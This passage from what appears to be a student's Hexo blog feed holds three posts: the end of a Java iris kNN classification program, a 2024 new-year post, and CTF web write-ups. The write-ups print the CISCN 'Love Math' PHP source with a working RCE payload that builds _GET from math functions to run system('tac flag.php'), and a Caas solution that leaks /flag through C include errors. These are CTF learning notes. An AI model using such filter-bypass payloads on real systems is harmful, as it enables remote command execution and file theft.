class="params">(String[] args)</span>&#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;%s\n&quot;</span>, <span class="string">&quot;[+] START &quot;</span>);</span><br><span class="line">Flower[] flower = <span class="keyword">new</span> <span class="title class_">Flower</span>[<span class="number">1005</span>];</span><br><span class="line"><span class="type">int</span> flower_cnt=<span class="number">0</span>;</span><br><span class="line"><span class="comment">// 1.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 1.&quot;</span>);</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;D:\\浏览器下载\\iris.csv&quot;</span>));</span><br><span class="line">List&lt;String&gt; lines = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span>((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">lines.add(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> FirstLine=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(String line1:lines) &#123;</span><br><span class="line"><span class="keyword">if</span>(FirstLine==<span class="literal">true</span>) &#123;</span><br><span class="line">FirstLine = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[] values = line1.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="type">double</span> <span class="variable">a</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">0</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">1</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">2</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">3</span>]);</span><br><span class="line"><span class="type">String</span> <span class="variable">e</span> <span class="operator">=</span> values[<span class="number">4</span>];</span><br><span class="line"><span class="type">Flower</span> <span class="variable">tmpFlower</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Flower</span>(a, b, c, d, e);</span><br><span class="line">flower[flower_cnt] = tmpFlower;</span><br><span class="line">flower_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(Flower i:flower) &#123;</span><br><span class="line"><span class="keyword">if</span>(i!=<span class="literal">null</span>)</span><br><span class="line">System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 1. end&quot;</span>);</span><br><span class="line">br.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 2.&quot;</span>);</span><br><span class="line">flower_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;D:\\浏览器下载\\iris.csv&quot;</span>));</span><br><span class="line">List&lt;String&gt; lines = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span>((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">lines.add(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> FirstLine=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(String line1:lines) &#123;</span><br><span class="line"><span class="keyword">if</span>(FirstLine==<span class="literal">true</span>) &#123;</span><br><span class="line">FirstLine = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[] values = line1.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="type">double</span> <span class="variable">a</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">0</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">1</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">2</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">3</span>]);</span><br><span class="line"><span class="type">String</span> <span class="variable">e</span> <span class="operator">=</span> values[<span class="number">4</span>];</span><br><span class="line"><span class="type">Flower</span> <span class="variable">tmpFlower</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Flower</span>(a, b, c, d, e);</span><br><span class="line">flower[flower_cnt] = tmpFlower;</span><br><span class="line">flower_cnt++;</span><br><span class="line">&#125;</span><br><span class="line">flower_cnt++;</span><br><span class="line">Flower[] tmp_flower = <span class="keyword">new</span> <span class="title class_">Flower</span>[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">70</span>;i++)</span><br><span class="line">tmp_flower[i] = flower[i];</span><br><span class="line">tmp_flower[<span class="number">70</span>] = <span class="keyword">new</span> <span class="title class_">Flower</span>(<span class="number">6.7</span>, <span class="number">3.3</span>, <span class="number">5.7</span>, <span class="number">2.5</span>, <span class="string">&quot;virginica&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">71</span>;i&lt;flower_cnt;i++)</span><br><span class="line">tmp_flower[i] = flower[i-<span class="number">1</span>];</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">br2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;D:\\浏览器下载\\answer_1.txt&quot;</span>));</span><br><span class="line">br2.write(Integer.toString(flower_cnt));</span><br><span class="line">br2.newLine();</span><br><span class="line"><span class="keyword">for</span>(Flower i:tmp_flower) &#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="literal">null</span>)<span class="keyword">continue</span>;</span><br><span class="line"><span class="type">double</span> <span class="variable">l</span> <span class="operator">=</span> i.geta();</span><br><span class="line"><span class="keyword">if</span>(l&gt;<span class="number">6.0</span>&amp;&amp;l&lt;<span class="number">6.9</span>) &#123;</span><br><span class="line">br2.write(i.toString());</span><br><span class="line">br2.newLine();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">br2.close();</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 2. end&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.</span></span><br><span class="line">System.out.println(<span class="string">&quot;[+] 3.&quot;</span>);</span><br><span class="line">List&lt;Flower&gt; flowerList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Flower&gt;();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;flower_cnt;i++)</span><br><span class="line">flowerList.add(tmp_flower[i]);</span><br><span class="line">Collections.sort(flowerList,<span class="keyword">new</span> <span class="title class_">MyCompare1</span>());</span><br><span class="line"><span class="keyword">for</span>(Flower c:flowerList) &#123;</span><br><span class="line"><span class="comment">//System.out.println(c.dis(new Flower(1, 2, 3, 4, &quot;WOw!&quot;)));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//System.out.println(&quot;---------------&quot;);</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">br3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;D:\\浏览器下载\\answer_2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">for</span>(Flower ifFlower:flowerList) &#123;</span><br><span class="line"><span class="keyword">if</span>(ifFlower==<span class="literal">null</span>)<span class="keyword">continue</span>;</span><br><span class="line">br3.write(ifFlower.toString());</span><br><span class="line">br3.newLine();</span><br><span class="line">&#125;</span><br><span class="line">br3.close();</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 3. end&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 4.&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\浏览器下载\\answer_3.ser&quot;</span>));</span><br><span class="line">Flower[] sorted_fower = <span class="keyword">new</span> <span class="title class_">Flower</span>[<span class="number">1005</span>];</span><br><span class="line">flower_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(Flower i:flowerList) &#123;</span><br><span class="line">sorted_fower[flower_cnt] = i;</span><br><span class="line">flower_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=flower_cnt-<span class="number">10</span>;i&lt;flower_cnt;i++) &#123;</span><br><span class="line">ser.writeObject(sorted_fower[i]);</span><br><span class="line">&#125;</span><br><span class="line">ser.close();</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 4. end&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.</span></span><br><span class="line">System.out.println(<span class="string">&quot;[+] 5.&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">test_flower_cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">Flower[] testFlowers = <span class="keyword">new</span> <span class="title class_">Flower</span>[<span class="number">1005</span>];</span><br><span class="line">List&lt;String&gt; test_flower = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;D:\\浏览器下载\\test.csv&quot;</span>));</span><br><span class="line">String line1;</span><br><span class="line"><span class="keyword">while</span>((line1 = br4.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">test_flower.add(line1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> FirstLine1=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(String line11:test_flower) &#123;</span><br><span class="line"><span class="keyword">if</span>(FirstLine1==<span class="literal">true</span>) &#123;</span><br><span class="line">FirstLine1 = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[] values = line11.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="type">double</span> <span class="variable">a</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">0</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">1</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">c</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">2</span>]);</span><br><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> Double.parseDouble(values[<span class="number">3</span>]);</span><br><span class="line"><span class="type">String</span> <span class="variable">e</span> <span class="operator">=</span> values[<span class="number">4</span>];</span><br><span class="line"><span class="type">Flower</span> <span class="variable">tmpFlower</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Flower</span>(a, b, c, d, e);</span><br><span class="line">testFlowers[test_flower_cnt] = tmpFlower;</span><br><span class="line">test_flower_cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(Flower dFlower:testFlowers) &#123;</span><br><span class="line"><span class="keyword">if</span>(dFlower==<span class="literal">null</span>)<span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">//System.out.println(dFlower);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//System.out.println(test_flower_cnt);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;test_flower_cnt;i++) &#123;</span><br><span class="line"><span class="type">Flower</span> <span class="variable">test</span> <span class="operator">=</span> testFlowers[i];</span><br><span class="line">List&lt;Flower&gt; trainingList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Flower&gt;();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;flower_cnt;j++) &#123;</span><br><span class="line">trainingList.add(tmp_flower[j]);</span><br><span class="line">&#125;</span><br><span class="line">compareoFlower = test;</span><br><span class="line">Collections.sort(trainingList, <span class="keyword">new</span> <span class="title class_">MyCompare2</span>(test));</span><br><span class="line"><span class="keyword">for</span>(Flower c:trainingList) &#123;</span><br><span class="line"><span class="keyword">if</span>(c==<span class="literal">null</span>)<span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">//System.out.println(c.dis(test));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ccc=<span class="number">0</span>;</span><br><span class="line">HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Integer&gt;(); </span><br><span class="line"><span class="keyword">for</span>(Flower iFlower:trainingList) &#123;</span><br><span class="line">ccc++;</span><br><span class="line"><span class="keyword">if</span>(ccc&gt;<span class="number">8</span>)<span class="keyword">break</span>;</span><br><span class="line">map.put(iFlower.gete(), map.getOrDefault(iFlower.gete(), <span class="number">0</span>)+<span class="number">1</span>); <span class="comment">// 建立映射关系并且更新++</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(map);</span><br><span class="line"><span class="type">int</span> maxx=<span class="number">0</span>;<span class="type">String</span> <span class="variable">aString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(String string:map.keySet()) &#123;</span><br><span class="line"><span class="keyword">if</span>(map.get(string)&gt;maxx) &#123;</span><br><span class="line">maxx = map.get(string);</span><br><span class="line">aString = string;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(aString);</span><br><span class="line">testFlowers[i].ModifyE(aString);</span><br><span class="line"><span class="comment">//System.out.println(testFlowers[i]);</span></span><br><span class="line">System.out.println(<span class="string">&quot;-----------------------&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">br5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;D:\\浏览器下载\\answer_4.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(Flower cString:testFlowers) &#123;</span><br><span class="line"><span class="keyword">if</span>(cString==<span class="literal">null</span>)<span class="keyword">continue</span>;</span><br><span class="line">System.out.println(cString);</span><br><span class="line">br5.write(cString.toString());</span><br><span class="line">br5.newLine();</span><br><span class="line">&#125;</span><br><span class="line">br5.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">br4.close();</span><br><span class="line">System.out.println(<span class="string">&quot;[+] 5. end&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">br.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">System.out.println(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;[+] END &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WHK </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Welcome-2024</title>
      <link href="/Welcome-2024/"/>
      <url>/Welcome-2024/</url>
      
        <content type="html"><![CDATA[<p>2024 is coming~</p><span id="more"></span><h1 id="回首2023"><a href="#回首2023" class="headerlink" title="回首2023"></a>回首2023</h1><p>年初入坑了美好的二次元~<br>京吹 小蓝鸟 点兔 jojo 安岛</p><p>寒假后 <del>yuri saikyou</del></p><p>5月入坑osu</p><p>7月正式入网安</p><p>8月21正式开始学习CTF</p><p>9月打第一场CTF NewStarCTF2023</p><p>11月<br>第一次CTF拿奖 (DAS11月赛no.6三等奖)</p><p>12月<br>搭好个人blog<br>Nozomi&#x2F;ULGANOY 🎂<br>第一次参加线下赛(“铸剑杯”)</p><h1 id="展望2024"><a href="#展望2024" class="headerlink" title="展望2024"></a>展望2024</h1><p>提升 逆向&#x2F;密码&#x2F;web 实力<br>争取机会 多打线下赛<br>学好whk 考试考好</p><p>四月京吹~<br>让北宇治的演奏响彻全国！<br>Kitauji Fightooooo！！！！！ 🎉🎉🎉</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web-Other</title>
      <link href="/Web-Other/"/>
      <url>/Web-Other/</url>
      
        <content type="html"><![CDATA[<p>web≈0 零碎记录些做的web题</p><span id="more"></span><h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察点在于利用whitelist里的函数怎么拼接出所需的RCEpayload<br>利用php动态函数调用特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;dir&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这种是可执行的<br>那么我们想要造出字符 就需要利用hex 而只能输入数字 那么就利用hex&#x2F;bin&#x2F;dec之间的转换函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>)); <span class="comment">// hex2bin()( dechex() )   _GET</span></span><br><span class="line"><span class="comment">// 核心利用了php的动态函数调用特性</span></span><br><span class="line"><span class="variable">$pi</span> = <span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$pi</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;/?c=<span class="subst">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));$<span class="subst">$pi</span>&#123;abs&#125;($<span class="subst">$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=tac flag.php&quot;</span>;</span><br><span class="line"><span class="comment">// 由于过滤了[] 所以采用 &#123;&#125;的方式取index一样的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用hex2bin 和 dechex拼出_GET 反复利用php字符串的动态特性<br>注意到题目过滤了[] 所以改用{}的方式来取index<br>最终payload: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;abs&#125;(<span class="variable">$$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=tac flag.php</span><br></pre></td></tr></table></figure><h1 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020 ]Caas"></a>[FireshellCTF2020 ]Caas</h1><p>题目给了个输入框 会compile我们的输入<br>随便输入发现会返回报错信息<br>尝试从python php 开始 最后发现是C的compile<br>可以参考<a href="https://blog.csdn.net/cjdgg/article/details/118446982" target="_blank">这篇</a></p><p>尝试  <code>#include &quot;/flag&quot;</code><br>在回显中得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;In file included from /tmp/caas_ys_36ohk.c:1:\n/flag:1:5: error: expected \xe2\x80\x98=\xe2\x80\x99, \xe2\x80\x98,\xe2\x80\x99, \xe2\x80\x98;\xe2\x80\x99, \xe2\x80\x98asm\xe2\x80\x99 or \xe2\x80\x98__attribute__\xe2\x80\x99 before \xe2\x80\x98&#123;\xe2\x80\x99 token\n flag&#123;0324396c-1b08-4f44-b195-fad8d9106c16&#125;\n ^\n/flag:1:6: error: invalid digit &quot;9&quot; in octal constant\n flag&#123;0324396c-1b08-4f44-b195-fad8d9106c16&#125;\n ^~~~~~~~\n/flag:1:15: error: invalid suffix &quot;b08&quot; on integer constant\n flag&#123;0324396c-1b08-4f44-b195-fad8d9106c16&#125;\n ^~~~\n/flag:1:20: error: invalid suffix &quot;f44&quot; on integer constant\n flag&#123;0324396c-1b08-4f44-b195-fad8d9106c16&#125;\n ^~~~\n&#x27;</span><br></pre></td></tr></table></figure><h1 id="BUUCTF-EasyBypass"><a href="#BUUCTF-EasyBypass" class="headerlink" title="[BUUCTF ] EasyBypass"></a>[BUUCTF ] EasyBypass</h1><p>页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span 